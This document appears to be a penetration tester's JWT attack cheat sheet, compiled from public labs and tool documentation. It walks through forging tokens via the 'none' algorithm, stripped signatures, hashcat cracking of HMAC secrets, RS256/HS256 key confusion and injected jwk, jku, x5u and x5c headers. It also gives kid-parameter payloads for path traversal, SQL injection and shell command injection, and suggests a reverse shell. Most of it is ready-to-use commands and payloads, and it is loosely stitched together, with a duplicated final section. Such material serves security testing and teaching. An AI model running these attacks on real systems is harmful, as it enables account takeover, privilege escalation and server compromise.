# JWT Security

#### Quick Wins

*   Run [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) with mode `All Tests!` and wait for green lines

    ```python
    python3 jwt_tool.py -M at \\
        -t "<https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245>" \\
        -rh "Authorization: Bearer eyJhbG...<JWT Token>"
    ```

    If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:

    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/672aad21-7a29-4d36-9c00-46dd14a96a52/Untitled.png)

    Then, you can search the request in your proxy or dump the used JWT for that request using jwt\_ tool:

    ```python
    python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
    ```
*   Required?

    Remove the token from the request and observe the result - has the result changed?

    **Was the token required?**

    * Yes - Good! on to the next step
    * No - perhaps the JWT isn't the means of authorisation on this app. Check for other headers, cookies or POST data that might be persisting the session. You may still be able to something with the token, so keep going.
*   Checked?

    Delete the last few characters of the signature. Does it: return an error, fail, or succeed?

    **Is the token checked?**

    * If an error message occurs the signature is being checked - read any verbose error info that might leak something sensitive.
    * If the page returned is different the signature is being checked.
    * If the page is the same then the signature is not being checked - time to start tampering the Payload claims to see what you can do!
*   Persistent?

    Resend the same token multiple times, interspersed with sending no token, or one with an invalid signature (delete a character or two from the end of the token). Does it continue to work each time the valid token is sent?

    **Is the token persistent?**

    * Yes - the token stays static, which is common behaviour. However, this may indicate an immortal token if the same JWT is valid after logout, or after a very long duration. Be sure to retest this same token in \~24 hours and report it if it never expires.
    * No - the token has either expired, or has been invalidated by the application. Some systems invalidate tokens every so often and either just send you a new token in a normal HTTP response, or may programmatically call a "refresh token" API endpoint to retrieve a new token. This may mean you need to switch out your base test token every so often, so keep re-checking it before sending a tampered token.
*   Origin

    Check where the token originated in your proxy's request history. It should be created on the server, not the client.

    * If it was first seen coming from the client-side then the **key** is accessible to client-side code - seek it out!
    * If it was first seen coming from the server then all is well.
*   Check claim-processing order

    Alter any Payload claims that are directly reflected or processed on the page, but leave the signature the same. Did the altered values get processed?

    **Example:** If the Payload contains a profile image URL or some text

    (e.g. _{"login": "ticarpi", "image": "_[_https://ticarpi.com/profile.jpg_](https://ticarpi.com/profile.jpg)_", "about": "Hello this is my profile page."}_)

    then tweak the address to see if a new image is reflected in the page, or the text to see if that is altered in the response.

    * **Tampering in jwt\_tool:** Enter tamper mode:
      * `python3 jwt_tool.py [token] -T`
      * Follow the menu to tamper various claims
      * (Optionally) set signing or exploit options via the **X** or **S** arguments
      * If the changes are accepted then the application is processing these before (or regardless of) signature verification. Look to see if you can tamper anything crucial.
      * If the changes aren't reflected then the JWT claims are being processed in the correct order.

#### Sensitive Data Exposure

```python
1. Turn Intercept on in burp and Login to Web App
2. Forward the request until you get JWT token
3. Switch to JSON Web Token Tab
4. Check if any user info or any sensitive info is there in payload section.
5. Done!

```

#### Exploiting flawed JWT signature verification

*   **Accepting arbitrary signatures**

    ```python
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Switch to JSON Web Token Tab or JOSEPH.
    4. Change Payload section and Remove the Signature completely or try changing somecharacters in signature
    5. Done, Forward the Request.

    # Tamper data without modifying anything
    You can just tamper with the data leaving the signature as is and check if the server is checking the signature. Try to change your username to "admin" for example.
    Is the token checked?
    - If an error message occurs the signature is being checked - read any verbose error info that might leak something sensitive.
    - If the page returned is different the signature is being checked.
    - If the page is the same then the signature is not being checked - time to start tampering the Payload claims to see what you can do!
    ```
*   **null signature (CVE-2020-28042):**

    ```jsx
    Delete the signature from the end of the token. If vulnerable the application will fail to check the signature as it sees nothing that needs checking.
    Use jwt_tool to create the modified token [IN PROGRESS]

    $ python3 jwt_tool.py JWT_HERE -X n
    ```

Many JWT libraries provide one method to decode the token and another to verify it:

* `decode()`: Only decodes the token from base64url encoding without verifying the signature.
* `verify()`: Decodes the token and verifies the signature.

Sometimes developers might mix up these methods. In that case, the signature is never verified and the application will accept any token (in a valid format). Developers might also disable signature verification for testing and then forget to re-enable it. Such mistakes could lead to arbitrary account access or privilege escalation.

#### Secret Keys Flaws

*   **Crack HMAC secret Key**

    If you can crack the HMAC secret then you can forge anything you like in the token. This could be a `**critical**` vulnerability.

    ```python
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    -----------------------------------
    3. If JWT-Heartbreaker Plugin is installed then weak secret-key will directly be shown to you.
    																			OR
    3. Copy JWT Token and store it in a text file then usse Hashcat to crack the Secret key using below command.
    		"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force"
    		"hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --show" //this will show cracked secret-key
    Hashcat commands:

    Dictionary attack: hashcat -a 0 -m 16500 jwt.txt wordlist.txt
    Rule-based attack: hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
    Brute force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
    																			OR
    3. Use Jwt_Tool to crack the secret key using below command:
    			"python3 jwt_tool.py <JWT> -C -d secrets.txt"
    ----------------------------------
    4. Now Use the Secret key to forge the request using jwt.io or jwt_tool with option "-p"
    5. Done, Use the generated token in request and forward the request.

    <https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key>
    ```
* **RSA Key Confusion (CVE-2016-5431):**
  1.  Find the Public Key → [Finding Public Keys · ticarpi/jwt\_tool Wiki (github.com)](https://github.com/ticarpi/jwt\_tool/wiki/Finding-Public-Keys)

      ```jsx
      /.well-known/jwks.json
      /openid/connect/jwks.json
      /jwks.json
      /api/keys
      /api/v1/keys
      ```
  2.  You will also need to use the right format of the Public Key. If the key is provided then you're fine, if not then best guess is [PEM format](https://en.wikipedia.org/wiki/Privacy-Enhanced\_Mail)

      Note that PEM should contain a single _newline_ character at the end, however some tools may miss this off when exporting a key.

      _Use jwt\_tool's -V flag alongside the -pk public.pem argument to verify that the Public Key you found matches the key used to sign the token_
  3. `python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem`

#### JWT Header Parameter Injection

*   \*\***`jwk` parameter**

    1. With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.
    2. [Generate a new RSA key.](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#adding-a-jwt-signing-key)
    3. Send a request containing a JWT to Burp Repeater.
    4. In the message editor, switch to the extension-generated **JSON Web Token** tab and [modify](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#editing-jwts) the token's payload however you like.
    5. Click **Attack**, then select **Embedded JWK**. When prompted, select your newly generated RSA key.
    6. Send the request to test how the server responds.

    **JWKS Injection (CVE-2018-0114):**

    `$ python3 jwt_tool.py JWT_HERE -X i`

    * If page returns valid then you have a bypass - go tampering.

    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d6851b04-cbdf-4b1d-9063-981bdb275688/Untitled.png)

    ```jsx
    Embedded Public Key (CVE-2018-0114)
    If the JWT has embedded a public key like in the following scenario:

    Using the following nodejs script it's possible to generate a public key from that data:
    --------------------------------------------
    const NodeRSA = require('node-rsa');
    const fs = require('fs');
    n ="ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8";
    e = "AQAB";
    const key = new NodeRSA();
    var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
    console.log(importedKey.exportKey("public"));
    -------------------------------------------------------------------------
    --> It's possible to generate a new private/public key, embeded the new public key inside the token and use it to generate a new signature:
    -----------------------------------------------------
    openssl genrsa -out keypair.pem 2048
    openssl rsa -in keypair.pem -pubout -out publickey.crt
    openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
    --> You can obtain the "n" and "e" using this nodejs script:
    const NodeRSA = require('node-rsa');
    const fs = require('fs');
    keyPair = fs.readFileSync("keypair.pem");
    const key = new NodeRSA(keyPair);
    const publicComponents = key.exportKey('components-public');
    console.log('Parameter n: ', publicComponents.n.toString("hex"));
    console.log('Parameter e: ', publicComponents.e.toString(16));
    ---------------------------------------------------------------------------------------
    	--> Finally, using the public and private key and the new "n" and "e" values you can use jwt.io to forge a new valid JWT with any information
    ```
*   \*\***`jku` parameter**

    jku stands for **JWK Set URL**. If the token uses a “**jku**” **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

    ```python
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Decode the JWT token and check if it contents jku attribute in Header section
    4. Generate you Public and Private Key pair using below commands:
    		"openssl genrsa -out keypair.pem 2048"
    		"openssl rsa -in keypair.pem -pubout -out publickey.crt"
    		"openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key"
    	8 it will generate Public Key - "publickey.crt" & Private Key - "pkcs8.key"
    5. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the "Decoded" section.
    6. Host the generated certificate locally and modify the jku header parameter accordingly.
    7. Retrieve the jwks.json file from the URL present in the jku header claim
    		"wget <http://example.com:8000/jwks.json>"
    8. Make a Python script "getPublicParams.py":
    		from Crypto.PublicKey import RSA

    		fp = open("publickey.crt", "r")
    		key = RSA.importKey(fp.read())
    		fp.close()
    		print "n:", hex(key.n)
    		print "e:", hex(key.e)
    9. Run python script "python getPublicParams.py"
    10. Update the values of n and e in local jkws.json
    11. Hosting the JWK Set JSON file using repl.it or any server
    12. Manipulate the payload section and copy the generated jwt token from jwt.io
    13. Done, change the JWT token in our request and Forward!
    ```

    ```python
    Part 1 - Upload a malicious JWK Set

    1. Go to the JWT Editor Keys tab in Burp's main tab bar Click New RSA Key.
    2. Replace the contents of the Body section with an empty JWK Set as follows:

    {
        "keys": [

        ]
    }
    3. Paste the JWK into the keys array on the exploit server, then store the exploit. The result should look something like this:

    {
        "keys": [
            {
                "kty": "RSA",
                "e": "AQAB",
                "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
                "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
            }
        ]
    }
    Part 2 - Modify and sign the JWT
    1. In the header of the JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.
    2. Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.
    {
        "kid": "0653ce73-f728-47e7-825e-10131f2ab908",
        "alg": "RS256",
        "jku": "<https://exploit-0ab0006a04eb956a81555b35017e0062.exploit-server.net/exploit>"
    }

    2. click Sign, then select the RSA key that you generated in the previous section, Make sure that the Don't modify header option is selected, then click ok
    3. Send the request. Observe that you have successfully accessed the admin panel.
    ```
*   **`kid` parameter**

    *   **Reveal key**

        If the claim "`kid`" is used in the header, check the web directory for that file or a variation of it. For example if `"kid":"key/12345"` then look for _`/key/12345`_ and _`/key/12345.pem`_ on the web root.

    ```python
    # Sql Injection
    IF an application uses the kid parameter to retrieve the key from a database, it might be vulnerable to SQL injection. 

    If successful, an attacker can control the value returned to the kid parameter from an SQL query and use it to sign a malicious token.
    Again using the same example token, let’s say the application uses the following vulnerable SQL query to get its JWT key via the kid parameter:

    SELECT key FROM keys WHERE key='key1'

    An attacker can then inject a UNION SELECT statement into the kid parameter to control the key value:

    {  "alg": "HS256",  "typ": "JWT",  "kid": "xxxx' UNION SELECT 'aaa"}.{  "name": "John Doe",  "user_name": "john.doe",  "is_admin": true}

    If SQL injection succeeds, the application will use the following query to retrieve the signature key:

    SELECT key FROM keys WHERE key='xxxx' UNION SELECT 'aaa'

    This query returns aaa into the `kid` parameter, allowing the attacker to sign a malicious token simply with `aaa`.  To avoid these and other injection attacks, applications should always sanitize the value of the `kid` parameter before using it.
    ```

    ```python
    1. Go to the JWT Editor Keys tab in Burp's main tab bar Generate to generate a new key in JWK format
    2. Replace the generated value for the k property with a Base64-encoded null byte (AA==). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
    3. In the header of the JWT, change the value of the kid parameter to a path traversal sequence pointing to the /dev/null file:
    ../../../../../../../dev/null

    {
        "kid": "../../../../../../../../dev/null",
        "alg": "HS256"
    }

    4. At the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section.
    ```

    ```python
    # Use arbitrary files to verify
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. If there is kid in header section of JWT_token then forge a new JWT token using jwt_tool
    		'python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../../../dev/null" -S hs256 -p ""'
    * Alternatively, we may utilise the content of any file in the web root, such as CSS or JS, to validate the Signature.
    		'python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"'
    4. Manipulate payload section and now use the generated token in request.
    5. Done, Forward the Request.

    # SQL injection
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Switch to JSON Web Token Plugin tab and manipulate kid with sqli payload.
    4. You can try SQLi not only in kid but in any field of payload section.
    		"python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem"
    5. Done, Forward the request and escalate sqli further.

    # Command injection
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Switch to JSON Web Token Plugin tab and manipulate kid with os commands payload.
    	"kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &"
    4. Now use the forged JWt token in request
    5. Check if you can connect to the server on port 1337 or instead use reverse shell in payload and check if you get connection back
    6. DOne
    In a scenario where the "kid" parameter contains a path to the file with the key and this path is being used inside an executed command you could be able to obtain RCE and expose the private key with a payload like the following: 
    /root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
    ```
*   **Other Headers Attacks |** [JWT Vulnerabilities (Json Web Tokens) - HackTricks](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#x5u)

    ```python
    x5u Claim Misuse:
    Note: The algorithm used for signing the token is “RS256”.
    The token is using x5u header parameter which contains the location of the X.509 certificate to be used for token verification.

    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Decode the JWT token and check if it contents x5u attribute in Header section.
    4. Creating a self-signed certificate
    			"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt"
    5. Extracting the public key from the generated certificate:
    			"openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem"
    6. Use Jwt.io and paste the public key (publicKey.pem) and the private key (attacker.key) in their respective places in the "Decoded" section.
    7. Set "x5u: <http://192.87.15.2:8080/attacker.crt>" you can use repl.it to host
    8. Done Use forged jwt token in request.

    -------------------------------
    x5c Claim Misuse:
    Note:The algorithm used for signing the token is “RS256”.
    The token is using x5c header parameter which contains the X.509 certificate to be used for token verification.
    The token has various fields: n, e, x5c, x5t, kid. Also, notice that kid value is equal to x5t value.

    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token.
    3. Decode the JWT token and check if it contents x5c attribute in Header section.
    * <https://jwt.io> automatically extracts the X.509 certificate and places it in the “Verify Signature” sub-section in “Decoded” section.

    4. Create a self-signed certificate:
    		"openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt"
    5. Extracting RSA public key parameters (n and e) from the generated certificate
    		"openssl x509 -in attacker.crt -text"
    6. Converting modulus (n) to base64-encoded hexadecimal strings
    		"echo "Modules (n) value will be here"| sed ‘s/://g’ | base64 | tr ‘\\n’ ‘ ‘ | sed ‘s/ //g’ | sed ‘s/=//g’"
    7. Converting exponent (e) to base64-encoded hexadecimal strings
    		"echo "exponent (e) here" | base64 | sed ‘s/=//g’"
    8. Finding the new x5c value
    		"cat attacker.crt | tr ‘\\n’ ‘ ‘ | sed ‘s/ //g’"
    9. Copy the contents excluding the — -BEGINCERTIFICATE — — and — — ENDCERTIFICATE — — part.
    8. Finding the new x5t value
    		"echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | sed ‘s/SHA1 Fingerprint=//g’ | sed ‘s/://g’ | base64 | sed ‘s/=//g’"
    * Note: The kid parameter would also get the same value as x5t parameter.
    9. Creating a forged token using all the parameters calculated in the previous step.
    10. Visit <https://jwt.io> and paste the token retrieved in Step 3 in the “Encoded” section.
    11. Paste the X.509 certificate (attacker.crt) and the private key (attacker.key) in their respective places in the “Decoded” section.
    12. Manipulate Payload section and copy the forged token
    13. Replace the forged token in the request and forward. Done!!
    ```

According to the JWS specification, only the `alg` header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

* `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.
* `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
* **`x5u and x5c` header parameter -** _The x5u and x5c header arguments, like the jku and jwk headers, allow attackers to define the public key certificate or certificate chain used to verify the token. x5u defines information in URI form, whereas x5c permits certificate data to be incorporated in the token._ Details of these attacks are beyond the scope of these materials, but for more details, check out [CVE-2017-2800](https://talosintelligence.com/vulnerability\_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633).
* **`x5t parameter`** - _The "x5t" (x.509 certificate thumbprint) header argument returns a base64url encoded SHA-256 thumbprint (i.e., digest) of an X.509 certificate's DER encoding, which may be used to match a certificate. As a result, it is equivalent to the key identifier or the kid claim!!_
* `cty` (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a `cty` header to change the content type to `text/xml` or `application/x-java-serialized-object`, which can potentially enable new vectors for [XXE](https://portswigger.net/web-security/xxe) and [deserialization](https://portswigger.net/web-security/deserialization) attacks
* `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching `kid` parameter.

#### Algorithm confusion attacks

**Symmetric vs asymmetric algorithms**

| Algorithm        | Key used to sign | Key used to verify |
| ---------------- | ---------------- | ------------------ |
| Asymmetric (RSA) | Private key      | Public key         |
| Symmetric (HMAC) | Shared secret    | Shared secret      |

*   **'none' Algorithm (CVE-2015-9235):**

    ```python
    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token
    3. Switch to JSON Web Token Tab or JOSEPH which also contains bypass
    4. Change "alg:" to None, none, NONE, nOnE "alg:none"
    		{
    		  "alg": "none",
    		  "typ": "JWT"
    		}
    5. Change the Payload and edit the signature to empty
    		Signature = ""
    6. Forward the Request. Done!

    OR 
    python3 jwt_tool.py JWT_HERE -X a
    If the page returns valid then you have a bypass - go tampering.
    ```
* **JWT authentication bypass via algorithm confusion**
  1.  go to the standard endpoint `/jwks.json` OR `/.well-known/jwks.json` and observe that the server exposes a JWK Set containing a single public key.

      ```python
      {"keys":[{"kty":"RSA","e":"AQAB","use":"sig","kid":"73074f03-e068-4cee-b65d-c20462bb63fe","alg":"RS256","n":"z93g-LLs1HOfCA7pBj5eu43Kt-R4gVfJ2Wa8oCr8H31j7YUajf0Ypum6dSLER9Lw3YBzY6XjRKhGh_2T0bZjhqumi4gvwJmVMUWlbhcnH6Qvei9sqlC6isreOyewjwNvAal-taaq6eL7_jono4amdXQJ1LjYVnrhqRjkGtIF6Rg1wy361DjQact9dqal-dHzuImO0HcvWJK9-RsuYv5hrkKglysk948df-ylDqC4LSDVGut0DUPUJxXwWGFBhHlqJFEVPsC3yMUQ1shQQN9fzQ-8jFgFAzidthi53xykJS7J73y34iJ-ryYzce1uzl_SUnEl_b9f9GrTl4bF6g8hJw"}]}

      ```
  2. Copy the JWK object from inside the `keys` array. Make sure that you don't accidentally copy any characters from the surrounding array
  3. go to the **JWT Editor Keys** tab in Burp's main tab bar, Click **New RSA Key**.
  4. Right-click on the entry for the key that you just created, then select **Copy Public Key as PEM**.
  5. Use the **Decoder** tab to Base64 encode this PEM key, then copy the resulting string.
  6. Click **New Symmetric Key**. In the dialog, click **Generate** to generate a new key in JWK format
  7. Replace the generated value for the k property with a Base64-encoded PEM that you just created
  8. In the header of the JWT, change the value of the `alg` parameter to `HS256` .
  9. In the payload, change the value of the `sub` claim to `administrator`.
  10. At the bottom of the tab, click **Sign**, then select the symmetric key that you generated in the previous section.
* **JWT authentication bypass via algorithm confusion with no exposed key**
  1. **Obtain two JWTs generated by the server \[ login → copy jwt → logout → login again → copy another jwt ]**
  2.  **Brute-force the server's public key \[** `docker run --rm -it portswigger/sig2n <token1> <token2>` ] [https://github.com/silentsignal/rsa\_sign2n/blob/release/standalone/jwt\_forgery.py](https://github.com/silentsignal/rsa\_sign2n/blob/release/standalone/jwt\_forgery.py)

      ```python
      This uses the JWTs that you provide to calculate one or more potential values of n. 
      Don't worry too much about what this means - all you need to know is that only one of these matches the value of n used by the server's key. 
      For each potential value, our script outputs:

      A Base64-encoded PEM key in both X.509 and PKCS1 format.
      A forged JWT signed using each of these keys

      Copy the tampered JWT from the first X.509 entry (you may only have one).
      Go back to your request in Burp Repeater and change the path back to /my-account
      Replace the session cookie with this new JWT and then send the request.
      If you receive a 200 response and successfully access your account page, then this is the correct X.509 key.
      If you receive a 302 response that redirects you to /login and strips your session cookie, then this was the wrong X.509 key. In this case, repeat this step using the tampered JWT for each X.509 key that was output by the script.
      ```
  3. In Burp, go to the **JWT Editor Keys** tab and click **New Symmetric Key,**
  4. Replace the generated value for the `k` property with a Base64-encoded key that you just copied. Note that this should be the actual key, not the tampered JWT that you used in the previous section.
  5.  Switch to the extension-generated **JSON Web Token** tab.

      ```python
      In the header of the JWT, make sure that the alg parameter is set to HS256.
      In the JWT payload, change the value of the sub claim to administrator.
      At the bottom of the tab, click Sign, then select the symmetric key that you generated in the previous section.
      ```
*   **Change algorithm from RS256 to HS256**

    The algorithm HS256 uses the secret key to sign and verify each message. The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.

    If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

    Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:

    ```python
    openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem 
    '''
    For this attack you can use the JOSEPH Burp extension. 
    In the Repeater, select the JWS tab and select the Key confusion attack. 
    Load the PEM, Update the request and send it. 
    (This extension allows you to send the "non" algorithm attack also). 
    It is also recommended to use the tool **jwt_tool** with the option 2 as the previous Burp Extension does not always works well.
    '''
    openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
    ```

    ```python
    Note: This Attack will convert the workflow from Asymmetric to Symmetric encryption and now we can sign the new tokens with the same public key.

    1. Turn Intercept on in burp and Login to Web App
    2. Forward the request until you get JWT token
    3. Get the Public key from the Application (pubkey.pem file) using below commands.
    		"openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem"
    		"openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem"
    																OR
    		"openssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout"
    4. Then use below command to generate JWT token.
    		"python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem"
    5. Use the generated token in the request and try changing payload.
    6. Done, Forward the request.

    * This will work when web app support both algorithm.
    ```

#### Miscellaneous attacks

*   **JWT Expire Abuse**

    **Duration →** Check if the token lasts more than 24h... maybe it never expires. If there is a "`exp`" filed, check if the server is correctly handling it.

    ```python
    Is exp checked?
    The “exp” Payload claim is used to check the expiry of a token. As JWTs are often used in the absence of session information, so they do need to be handled with care - in many cases capturing and replaying someone else’s JWT will allow you to masquerade as that user.
    One mitigation against JWT replay attacks (that is advised by the JWT RFC) is to use the “exp” claim to set an expiry time for the token. It is also important to set the relevant checks in place in the application to make sure this value is processed and the token rejected where it is expired. If the token contains an “exp” claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed. Use jwt_tool's -R flag to read the content of the token, which includes timestamp parsing and expiry checking (timestamp in UTC)
    If the token still validates in the application then this may be a security risk as the token may NEVER expire.

    or you can even try to edit exp: parameter
    ```
*   **Cross-service relay attacks**

    ```python
    Some web applications use a trusted JWT ‘service’ to generate and manage tokens for them. In the past some instances have occurred where a token generated for one of the JWT services’ clients can actually be accepted by another of the JWT services’ clients.
    If you observe the JWT being issued or renewed via a third-party service then it is worth identifying if you can sign up for an account on another of that service’s clients with your same username/email. 
    If so try taking that token and replaying it in a request to your target. Is it accepted?

    If your token is accepted then you may have a critical issue allowing you to spoof any user’s account. HOWEVER, be aware that if you are signing up on a third party application you may need to seek permission for wider testing permissions in case it enters a legal grey-area!
    ```

#### JWT ID

```python
JTI (JWT ID)
The JTI (JWT ID) claim provides a unique identifier for a JWT Token. It can beused to prevent the token from being replayed.
However, imagine a situation where the maximun length of the ID is 4 (0001-9999). The request 0001 and 10001 are going to use the same ID. 
So if the backend is incrementig the ID on each request you could abuse this to replay a request (needing to send 10000 request between each successful replay).
```

#### Other Attacks

*   **Usage of Example JWT Tokens**

    However, some JS files were accessible without authentication. Testing revealed that the application used JWT tokens that were sent via the Microsoft SSO system after a secure login.

    On the back-end mechanism, there was a security misconfiguration that didn’t check if the JWT token was generated for that specific application–instead, it accepted any JWT token that had a valid signature. So, using an example JWT token from [Microsoft’s website](https://docs.microsoft.com/en-us/azure/active-directory/develop/id-tokens#sample-v10-id-token):

    Within generic values:

    It was possible to access the internal endpoints, leaking the company data.
*   **ATO from IDOR**

    ```python

    1. So, anytime I hunt for flaws, the first thing I check for is ATO, so I created an account, and the application was JWT tokens for authentication, so I quickly copied my JWT and went to jwt.io to decode it, and it looked something like this-

    2. After investigating this, I was 50% certain that there was a weakness, therefore the next step was to find a means to obtain other people’s user ids.

    3. So I assumed it might have leaked in response to our request for a password reset, but it wasn’t disclosing the user id instead, it was leaking something more juicy, which will be described later.

    4. Then I tried to login with wrong password and checked the response of the request and it was leaking the user id

    5. Then I immediately created a 2 account, obtained its user id, and proceeded to jwt.io to replace it and obtain the JWT Token, after which I entered in with my 1 account but updated the JWT, and guess what? I was in into my 2 account.
    ```

**Key Database Mismanagement**

[Hacking JWT Tokens: Key Database Mismanagement](https://blog.pentesteracademy.com/hacking-jwt-tokens-key-database-mismanagement-58cec7769120)

**Verification Key Mismanagement**

[Hacking JWT Tokens: Verification Key Mismanagement](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-1b69c89ffdfb)

[Hacking JWT Tokens: Verification Key Mismanagement II](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-ii-12ca82674850)

[Hacking JWT Tokens: Verification Key Mismanagement III](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iii-7581805f4d58)

[Hacking JWT Tokens: Verification Key Mismanagement IV](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac)

**Vulnerable Key Generator**

[Hacking JWT Tokens: Vulnerable Key Generator](https://blog.pentesteracademy.com/hacking-jwt-tokens-vulnerable-key-generator-aff412d8d84d)

**Transaction Replay**

[Hacking JWT Tokens: Transaction Replay](https://blog.pentesteracademy.com/hacking-jwt-tokens-transaction-replay-56f449c2e0d0)

[Hacking JWT Tokens: Transaction Replay II](https://blog.pentesteracademy.com/hacking-jwt-tokens-transaction-replay-ii-5d6ee5141e25)

**JWS Standard for JWT**

[Hacking JWT Tokens: JWS Standard for JWT](https://blog.pentesteracademy.com/hacking-jwt-tokens-jws-standard-for-jwt-666810809323)

[Hacking JWT Tokens: JWS Standard for JWT II](https://medium.com/pentester-academy-blog/hacking-jwt-tokens-jws-standard-for-jwt-ii-7c92c70c7198)

**Bypassing NBF Claim**

[Hacking JWT Tokens: Bypassing NBF Claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-bypassing-nbf-claim-4e56af41ddbb)

**Special Version Claim**

[Hacking JWT Tokens: Special Version Claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-special-version-claim-5beed4198035)

**Cross Service Relay Attack — Missing audience claim**

[Hacking JWT Tokens: Cross Service Relay Attack -  Missing audience claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-cross-service-relay-attack-missing-audience-claim-4168f6b4c5bb)

**Cross Service Relay Attack — Misconfigured audience claim**

[Hacking JWT Tokens: Cross Service Relay Attack - Misconfigured audience claim](https://blog.pentesteracademy.com/hacking-jwt-tokens-cross-service-relay-attack-misconfigured-audience-claim-a68d8efc61d)

**Client Side Token Decode**

[Hacking JWT Tokens: Client Side Token Decode](https://blog.pentesteracademy.com/hacking-jwt-tokens-client-side-token-decode-9db43f10a3eb)

*   **Usage of Example JWT Tokens**

    However, some JS files were accessible without authentication. Testing revealed that the application used JWT tokens that were sent via the Microsoft SSO system after a secure login.

